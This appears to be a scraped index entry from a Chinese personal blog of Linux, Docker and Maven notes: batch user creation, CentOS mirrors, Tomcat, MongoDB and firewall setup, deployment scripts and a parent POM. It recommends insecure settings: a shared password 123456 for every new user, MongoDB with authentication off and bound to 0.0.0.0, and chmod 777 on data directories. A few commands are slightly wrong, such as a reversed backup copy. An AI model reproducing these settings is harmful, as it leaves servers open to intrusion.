daemon❌1:1:System daemons:/etc: bin❌2:2:Owner of system commands:/bin: sys❌3:3:Owner of system files:/usr/sys: adm❌4:4:System accounting:/usr/adm: uucp❌5:5:UUCP administrator:/usr/lib/uucp: auth❌7:21:Authentication administrator:/tcb/files/auth: cron❌9:16:Cron daemon:/usr/spool/cron: listen❌37:4:Network daemon:/usr/net/nls: lp❌71:18:Printer administrator:/usr/spool/lp: sam❌200:50:Sam san:/home/sam:/bin/sh 从上面的例子我们可以看到，/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：\n1 用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell 添加批量用户 （1）先编辑一个文本用户文件。\n每一列按照/etc/passwd密码文件的格式书写，要注意每个用户的用户名、UID、宿主目录都不可以相同，其中密码栏可以留做空白或输入x号。一个范例文件user.txt内容如下：\n1 2 3 4 5 6 user001::600:100:user:/home/user001:/bin/bash user002::601:100:user:/home/user002:/bin/bash user003::602:100:user:/home/user003:/bin/bash user004::603:100:user:/home/user004:/bin/bash user005::604:100:user:/home/user005:/bin/bash user006::605:100:user:/home/user006:/bin/bash （2）以root身份执行命令 /usr/sbin/newusers，从刚创建的用户文件user.txt中导入数据，创建用户：\n1 # newusers \u0026lt; user.txt 然后可以执行命令 vipw 或 vi /etc/passwd 检查 /etc/passwd 文件是否已经出现这些用户的数据，并且用户的宿主目录是否已经创建。\n（3）执行命令/usr/sbin/pwunconv。\n将 /etc/shadow 产生的 shadow 密码解码，然后回写到 /etc/passwd 中，并将/etc/shadow的shadow密码栏删掉。这是为了方便下一步的密码转换工作，即先取消 shadow password 功能。\n1 # pwunconv （4）编辑每个用户的密码对照文件。\n格式为：\n1 用户名:密码 实例文件 passwd.txt 内容如下：\n1 2 3 4 5 6 user001:123456 user002:123456 user003:123456 user004:123456 user005:123456 user006:123456 （5）以 root 身份执行命令 /usr/sbin/chpasswd。\n创建用户密码，chpasswd 会将经过 /usr/bin/passwd 命令编码过的密码写入 /etc/passwd 的密码栏。\n1 # chpasswd \u0026lt; passwd.txt （6）确定密码经编码写入/etc/passwd的密码栏后。\n执行命令 /usr/sbin/pwconv 将密码编码为 shadow password，并将结果写入 /etc/shadow。\n1 # pwconv 这样就完成了大量用户的创建了，之后您可以到/home下检查这些用户宿主目录的权限设置是否都正确，并登录验证用户密码是否正确。\nCentos 换国内源 https://blog.csdn.net/sinat_31089473/article/details/105929293\n1 2 3 4 5 6 7 8 备份一份文件 cp /etc/yum.repos.d/CentOS-Base.repo.backup /etc/yum.repos.d/CentOS-Base.repo 下载国内源 wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 生成缓存 yum makecache 安装Java https://www.cnblogs.com/lumama520/p/11058927.html\n1 2 3 4 5 6 7 8 9 10 11 解压压缩包 tar -zxvf /home/binbin/jdk-8u301-linux-x64.tar.gz -C /usr/local/java/ 配置环境变量 vim /etc/profile 使环境变量生效 source /etc/profile 检查Java版本 java -version 安装Tomcat https://blog.csdn.net/qq_21077715/article/details/85541685\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 新建文件夹 mkdir usr/local/tomcat9 解压压缩包 tar -zxvf /home/binbin/apache-tomcat-9.0.54.tar.gz -C /usr/local/tomcat9/ 启动tomcat /usr/local/tomcat9/apache-tomcat-9.0.54/bin/startup.sh 开放防火墙端口 firewall-cmd --zone=public --add-port=8080/tcp --permanent firewall-cmd --reload 查看防火墙信息 firewall-cmd --list-all 开放对外端口 ==注意：centos7自带的防火墙已经不是iptables了，改成了firewalld== ufw也是一种防火墙\n执行命令时，出现firewalld is not running的报错，用以下命令将firewalld起起来即可\n1.查看firewalld状态：systemctl status firewalld，如果是dead状态，即防火墙未开启。\n2.开启防火墙：systemctl start firewalld\n3.确认firewalld状态:systemctl status firewalld\n4.开放默认端口号 3306，出现success表示成功\n1 firewall-cmd --permanent --zone=public --add-port=3306/tcp 5.重新加载防火墙配置：firewall-cmd --reload\n6.设置firewalld开机启动：systemctl enable firewalld\n7.关闭防火墙：systemctl stop firewalld\n8.查看该机器有几个端口开放：firewall-cmd --list-all、firewall-cmd --zone=public --list-ports\n经过上述操作后外网还是访问不到tomcat\n可能是服务没开？\nhttps://www.cnblogs.com/cui0614/p/12746383.html\n但是开了之后还不行\n==主要原因是我是在腾讯云上买的服务器，所以要在腾讯云上面先开端口号~！！！！==\n因为centos7自带的防火墙已经不是iptables了，改成了firewalld，所以不用下面的这种方法解决\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # Generated by iptables-save v1.4.7 on Tue Aug 20 10:09:45 2019 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [19:1438] -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A INPUT -p icmp -j ACCEPT -A INPUT -i lo -j ACCEPT -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT -A INPUT -p tcp -m tcp --dport 20001 -j ACCEPT -A INPUT -j REJECT --reject-with icmp-host-prohibited -A FORWARD -j REJECT --reject-with icmp-host-prohibited COMMIT # Completed on Tue Aug 20 10:09:45 2019 注意这一行-A INPUT -j REJECT --reject-with icmp-host-prohibited，如果我们添加的规则在这行之下那么就不会生效\n解决办法：在-A INPUT -j REJECT --reject-with icmp-host-prohibited之前加入我们的规则即可\n如果防火墙放行了端口，但是仍然访问不到的话，可能是因为添加规则的时候，用的是iptables -A 选项，这样，增加的规则会排列在 第6条 规则后面，虽然service iptables status显示放行了端口，但是实际上，由于第六条规则的原因，新增加的这条并没有起作用。\n改为使用iptables -I 插入规则即可，将规则添加到 第6条 之前，就可以生效了。\n但是当我执行service iptables status命令时出现如下错误：\n1 2 Redirecting to /bin/systemctl status iptables.service Unit iptables.service could not be found. 原因是没有安装iptables-services\nhttps://blog.csdn.net/y368769/article/details/104490697/\n安装MongoDB https://www.jianshu.com/p/994bc7b19b26\nhttps://www.cnblogs.com/xiaoyaojinzhazhadehangcheng/p/12156597.html\n1.解压\n1 tar -zxvf /home/binbin/mongodb-linux-x86_64-4.0.0.tgz -C /usr/local/ 之后装的时候把文件目录改个名，因为之后要有很多关于这个目录的配置\n1 2 [root@VM-4-12-centos ~]# cd /usr/local [root@VM-4-12-centos local]# mv mongodb-linux-x86_64-4.0.0/ mongodb 2.修改配置文件\n1 vim /etc/profile 在 export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL 一行的上面添加如下内容:\n1 2 #set mongodb export PATH=/usr/local/mongodb-linux-x86_64-4.0.0/bin:$PATH 使环境变量生效\n1 source /etc/profile 3.创建数据库目录\n1 2 3 4 5 6 $ cd /usr/local/mongodb $ touch mongodb.conf $ mkdir db $ mkdir log $ cd log $ touch mongodb.log 4.修改mongodb配置文件\n1 vim /usr/local/mongodb/mongodb.conf 添加以下内容\n1 2 3 4 5 6 7 8 9 10 11 port=27017 #端口 dbpath= /usr/local/mongodb/db #数据库存文件存放目录 logpath= /usr/local/mongodb/log/mongodb.log #日志文件存放路径 logappend=true #使用追加的方式写日志 fork=true #以守护进程的方式运行，创建服务器进程 maxConns=100 #最大同时连接数 noauth=true #不启用验证 journal=true #每次写入会记录一条操作日志（通过journal可以重新构造出写入的数据）。 #即使宕机，启动时wiredtiger会先将数据恢复到最近一次的checkpoint点，然后重放后续的journal日志来恢复。 storageEngine=wiredTiger #存储引擎有mmapv1、wiretiger、mongorocks bind_ip = 0.0.0.0 #这样就可外部访问了，例如从win10中去连虚拟机中的MongoDB 5.设置文件夹权限\n1 2 3 $ cd /usr/local/mongodb $ chmod 777 db $ chmod 777 log 6.启动mongodb\n1 mongod --config /usr/local/mongodb/mongodb.conf 7.安装完之后记得开放端口\n部署项目 https://www.cnblogs.com/shu-java-net/p/13886242.html\n1.Springboot 先打包成jar包\n2.放到服务器上\n1 nohup java -jar NettyAPI.jar \u0026amp; nohup 意思是不挂断运行命令,当账户退出或终端关闭时,程序仍然运行，\n当用 nohup 命令执行作业时，缺省情况下该作业的所有输出被重定向到nohup.out的文件中，除非另外指定了输出文件。\n3.结束项目\n1 ps -aux | grep java 把这个端口kill掉\n1 kill -s 9 4287 4.使用nginx：外网访问内网项目\n1 nginx -s reload 写 .sh 自动启动 1、自己将项目（比如用springboot框架写的项目）打包成jar包，然后我们需要将它用软件传输到linux版本的服务器上（服务器提前安装好JDK\u0026gt;=1.8）。\n2、自己编写sh命令，用于启动和关闭项目，并打印日志信息到服务器本地。\n1）、start_项目名.sh文件\n1 2 3 4 5 6 7 8 9 #For shutting down the 你的项目名.jar pid=$(ps -ef | grep 你的项目名.jar| grep -v \u0026#34;grep\u0026#34; | awk \u0026#39;{print $2}\u0026#39;) kill -9 $pid echo \u0026#34;The 你的项目名.jar now has been shut down!\u0026#34; #For starting the 你的项目名.jar nohup java -jar 你的项目名.jar \u0026gt;你的项目日志名.output 2\u0026gt;\u0026amp;1 \u0026amp; echo \u0026#34;The 你的项目名.jar now is running!\u0026#34; tailf 你的项目日志名.output 2）、shutdown_项目名.sh文件\n1 2 3 4 #For shutting down the 你的项目名.jar pid=$(ps -ef | grep 你的项目名.jar| grep -v \u0026#34;grep\u0026#34; | awk \u0026#39;{print $2}\u0026#39;) kill -9 $pid echo \u0026#34;The 你的项目名.jar now has been shut down!\u0026#34; 3、将你的项目jar包、start_项目名.sh、shutdown_项目名.sh放在服务器的某一个文件夹下（他三个处于同一个目录）,此时，可以用控制台启动和关闭项目了。\n4、写完之后放到服务器上面要转换换行符\nhttps://blog.csdn.net/li_1303999/article/details/93159197\n文件下载 使用\nsz hadoop-mapreduce-examples-3.1.3.jar\n安装\nyum install -y lrzsz\n虚拟机扩容 https://blog.csdn.net/cc1949/article/details/89918775\n安装gparted\n1 yum install gparted 打开gparted\n1 sudo gparted 按照上述操作之后， df -h 还是没有变化\n输入 lsblk 发现分区并没有分完，虽然增加到sda2，但是每增加带centos-root中\n把用gparted划分的空间撤回，重新进行分区操作：\nhttps://blog.csdn.net/Akari0216/article/details/108944111\nhttps://zhuanlan.zhihu.com/p/450057653\n扩容之后\n==更新UUID值==\nhttps://blog.csdn.net/Chen_qi_hai/article/details/108814596\n查看mongodb安装路径 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #方法一 find / -name mongodb #方法二 locate mongodb #方法三 whereis mongodb #方法四 which mongodb 命令行注解 ps 1）ps -a 显示现行终端机下的所有程序，包括其他用户的程序。\n2）ps -A 显示所有程序。\n3）ps -c 列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。\n4）ps -e 此参数的效果和指定\u0026quot;A\u0026quot;参数相同。\n5）ps -e 列出程序时，显示每个程序所使用的环境变量。\n6）ps -f 用ASCII字符显示树状结构，表达程序间的相互关系。\n7）ps -H 显示树状结构，表示程序间的相互关系。\n8）ps -N 显示所有的程序，除了执行ps指令终端机下的程序之外。\n9）ps -s 采用程序信号的格式显示程序状况。\n10）ps - S 列出程序时，包括已中断的子程序资料。\n11）ps -t \u0026lt;终端机编号\u0026gt;指定终端机编号，并列出属于该终端机的程序的状况。\n12）ps -u username\ngrep 用于查找文件里符合条件的字符串\n管道符号 | 用法: command 1 | command 2 他的功能是把第一个命令command 1执行的结果作为command 2的输入传给command 2\nsed 参数说明：\n-i：使 sed 修改文件 -e","permalink":"https://chance7bin.github.io/posts/note/linux%E6%89%8B%E5%86%8C/","summary":"Ubuntu apt换国内源 https://blog.csdn.net/RadiantJeral/article/details/104184351 https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 打开终端输入命令下载vim工具 1 sudo apt-get install vim 1.备份 /etc/apt/sources.list 1 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 2.编辑 /etc/apt/sources.list 打开 /etc/apt/sources.list： 1","title":"Linux手册"},{"content":"1.使用docker commit 就算不进行任何操作，只要是commit两次生成的tar的md5都是不相等的 1 2 file1:367fc7b1e2ca4d416290c6b5b68e5283 file2:437eb32a507c44e781e36e18c3100f23 2.docker save/load 与 docker export/import https://www.cnblogs.com/Cherry-Linux/p/8025777.html\nhttps://cloud.tencent.com/developer/article/2027894\nexport export与import命令：\n注意：\n1.会丢弃历史记录和元数据。 2.启动export与import命令导出导入的镜像必须加/bin/bash或者其他/bin/sh，否则会报错。\ndocker: Error response from daemon: No command specified.\nexport： 导出容器会丢失历史记录和元数据，类似与快照。\ncommit 如果有docker镜像仓库的权限，也可以直接将生成的镜像push到docker仓库，然后在另一台主机上pull镜像并运行为容器即可。\n3.docker commit 原理 基于layer的概念，每次commit都是基于前面的镜像进行构建， 因此会越来越大（就算删除容器内的环境也不会变小）\nhttps://blog.csdn.net/weixin_41790086/article/details/102932185\nUnion FS\nhttps://www.jianshu.com/p/3ba255463047\nhttps://coolshell.cn/articles/17061.html\n示例 test6:1.0 是基于基础镜像commit生成的镜像\ntest7:1.0 是基于test6:1.0镜像commit生成的镜像，可以发现查看image history的时候 包含了基础镜像（59149c73a68c）以及test6:1.0镜像（d189c372fc80）\n我在test6:1.0镜像中，先pip install Pillow，生成test7:1.0 镜像大小增加2mb，接着我在test6:1.0中删除Pillow， commit生成test7:1.0，镜像大小还是比原来多出2mb，所以在容器中进行的任何操作，只会增加镜像大小，而不会使镜像减小\n4.docker export/import 启动export与import命令导出导入的镜像必须加/bin/bash或者其他/bin/sh，否则会报错。\ndocker: Error response from daemon: No command specified.\n解决方法：\n使用 docker ps -a \u0026ndash;no-trunc 查看启动容器需要的命令\n在run的时候加上上述红框内的命令，注意不要带上双引号，不然会报错：no such file or directory: unknown\n报错：\n5.docker commit 和 export 到底export可以缩小多少 基于多个镜像 迭代的\ncommit 方式是基于前面的镜像继续往上加 ，删除前面镜像安装的包的话再commit不能缩小镜像大小\nexport 是基于当前镜像的，删除前面镜像安装的包再export 生成的tar会缩小\n参考链接\nhttps://blog.csdn.net/weixin_43220532/article/details/123848167\nhttps://zhuanlan.zhihu.com/p/457356842\nhttps://blog.csdn.net/u011195077/article/details/108148824\nhttps://github.com/goldmann/docker-squash\n","permalink":"https://chance7bin.github.io/posts/note/docker-commitexport/","summary":"1.使用docker commit 就算不进行任何操作，只要是commit两次生成的tar的md5都是不相等的 1 2 file1:367fc7b1e2ca4d416290c6b5b68e5283 file2:437eb32a507c44e781e36e18c3100f23 2.docker save/load 与 docker export/import https://www.cnblogs.com/Cherry-Linux/p/8025777.html https://cloud.tencent.com/developer/article/2027894 export export与imp","title":"docker commit\u0026export"},{"content":"新建工程和确定工程目录 项目分的模块为：\nlab-admin项目核心模块 lab-common项目通用工具模块 1. 新建工程及多Module子工程 一、新建一个Maven工程\n二、填写项目信息\n三、删除一些新建Maven工程的不需要的文件（src文件夹）\n四、在该工程下新建子Module\n五、填写子Module信息(也是一个Maven工程)\n成果：\n(对应pom.xml会自动写好子父对应关系)\n六、重复第五步，完成其他子Module创建\n除了Module名不同，其他操作都一样。\n2. 编写pom.xml文件 父级pom文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;opengms\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;description\u0026gt;OpenGMS 实验室\u0026lt;/description\u0026gt; \u0026lt;packaging\u0026gt;pom\u0026lt;/packaging\u0026gt; \u0026lt;modules\u0026gt; \u0026lt;module\u0026gt;lab-admin\u0026lt;/module\u0026gt; \u0026lt;module\u0026gt;lab-common\u0026lt;/module\u0026gt; \u0026lt;/modules\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;lab.version\u0026gt;1.0.0\u0026lt;/lab.version\u0026gt; \u0026lt;project.build.sourceEncoding\u0026gt;UTF-8\u0026lt;/project.build.sourceEncoding\u0026gt; \u0026lt;project.reporting.outputEncoding\u0026gt;UTF-8\u0026lt;/project.reporting.outputEncoding\u0026gt; \u0026lt;java.version\u0026gt;1.8\u0026lt;/java.version\u0026gt; \u0026lt;maven-jar-plugin.version\u0026gt;3.1.1\u0026lt;/maven-jar-plugin.version\u0026gt; \u0026lt;druid.version\u0026gt;1.2.11\u0026lt;/druid.version\u0026gt; \u0026lt;bitwalker.version\u0026gt;1.21\u0026lt;/bitwalker.version\u0026gt; \u0026lt;swagger.version\u0026gt;3.0.0\u0026lt;/swagger.version\u0026gt; \u0026lt;kaptcha.version\u0026gt;2.3.2\u0026lt;/kaptcha.version\u0026gt; \u0026lt;mybatis-spring-boot.version\u0026gt;2.2.2\u0026lt;/mybatis-spring-boot.version\u0026gt; \u0026lt;pagehelper.boot.version\u0026gt;1.4.3\u0026lt;/pagehelper.boot.version\u0026gt; \u0026lt;fastjson.version\u0026gt;2.0.9\u0026lt;/fastjson.version\u0026gt; \u0026lt;oshi.version\u0026gt;6.2.1\u0026lt;/oshi.version\u0026gt; \u0026lt;commons.io.version\u0026gt;2.11.0\u0026lt;/commons.io.version\u0026gt; \u0026lt;commons.fileupload.version\u0026gt;1.4\u0026lt;/commons.fileupload.version\u0026gt; \u0026lt;commons.collections.version\u0026gt;3.2.2\u0026lt;/commons.collections.version\u0026gt; \u0026lt;poi.version\u0026gt;4.1.2\u0026lt;/poi.version\u0026gt; \u0026lt;velocity.version\u0026gt;2.3\u0026lt;/velocity.version\u0026gt; \u0026lt;jwt.version\u0026gt;0.9.1\u0026lt;/jwt.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;!-- 依赖声明 --\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- SpringBoot的依赖配置--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5.14\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot集成mybatis框架 --\u0026gt; \u0026lt;!-- pagehelper依赖包含了mybatis的依赖 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.mybatis.spring.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;mybatis-spring-boot-starter\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;${mybatis-spring-boot.version}\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${pagehelper.boot.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 阿里JSON解析器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.fastjson2\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${fastjson.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- io常用工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-io\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-io\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${commons.io.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 文件上传工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-fileupload\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-fileupload\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${commons.fileupload.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- excel工具 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.poi\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;poi-ooxml\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${poi.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- Token生成与解析--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.jsonwebtoken\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jjwt\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${jwt.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 解析客户端操作系统、浏览器等 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;eu.bitwalker\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;UserAgentUtils\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${bitwalker.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 阿里数据库连接池 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;druid-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${druid.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 验证码 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.penggle\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;kaptcha\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${kaptcha.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 获取系统信息 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.oshi\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;oshi-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${oshi.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; \u0026lt;!--编译及打包项目配置--\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-compiler-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;source\u0026gt;${java.version}\u0026lt;/source\u0026gt; \u0026lt;target\u0026gt;${java.version}\u0026lt;/target\u0026gt; \u0026lt;encoding\u0026gt;${project.build.sourceEncoding}\u0026lt;/encoding\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;!-- 不执行单元测试，但会编译测试类并在target/test-classes目录下生成相应的class --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-surefire-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.22.2\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;skipTests\u0026gt;true\u0026lt;/skipTests\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;!--依赖下载镜像源--\u0026gt; \u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;public\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;aliyun nexus\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://maven.aliyun.com/repository/public\u0026lt;/url\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; \u0026lt;!--插件镜像源--\u0026gt; \u0026lt;pluginRepositories\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;public\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;aliyun nexus\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://maven.aliyun.com/repository/public\u0026lt;/url\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;/pluginRepositories\u0026gt; \u0026lt;/project\u0026gt; 注意点：\n**一、**Maven中的\u0026lt;dependencyManagement\u0026gt;元素提供了一种管理依赖版本号的方式。在\u0026lt;dependencyManagement\u0026gt;元素中声明所依赖的jar包的版本号等信息，那么所有子项目再次引入此依赖jar包时则无需显式的列出版本号。Maven会沿着父子层级向上寻找拥有\u0026lt;dependencyManagement\u0026gt;元素的项目，然后使用它指定的版本号。\n**二、**关于\n1 2 \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; 解释：\n这样\u0026lt;dependencies\u0026gt;里面的依赖如果没有版本信息，就可以参考引入的pom文件的\u0026lt;dependencyManagement\u0026gt;里面的版本信息。就像maven继承方法似的，在父pom的\u0026lt; dependencyManagement\u0026gt;里，放入版本信息，在若干子pom里都省去版本信息了。子 pom只需到父pom的\u0026lt;dependencyManagement\u0026gt;里，找到相应的artifactId和groupId的版本信息即可。\n**三、**关于\n1 \u0026lt;packaging\u0026gt;pom\u0026lt;/packaging\u0026gt; 解释：\n配置\u0026lt;packaging\u0026gt;pom\u0026lt;/packaging\u0026gt;的意思是使用maven分模块管理，都会有一个父级项目，pom文件一个重要的属性就是packaging（打包类型），一般来说所有的父级项目的packaging都为pom，packaging默认类型jar类型，如果不做配置，maven会将该项目打成jar包。\n其他可填值：\npom \u0026mdash;\u0026mdash;\u0026mdash;\u0026gt; 父类型都为pom类型\njar \u0026mdash;\u0026mdash;\u0026mdash;\u0026gt; 内部调用或者是作服务使用\nwar \u0026mdash;\u0026mdash;\u0026mdash;\u0026gt; 需要部署的项目\n**四、**Maven中optional和scope元素的使用\n解释：https://developer.aliyun.com/article/844335\nlab-admin的pom文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;artifactId\u0026gt;opengms\u0026lt;/artifactId\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; 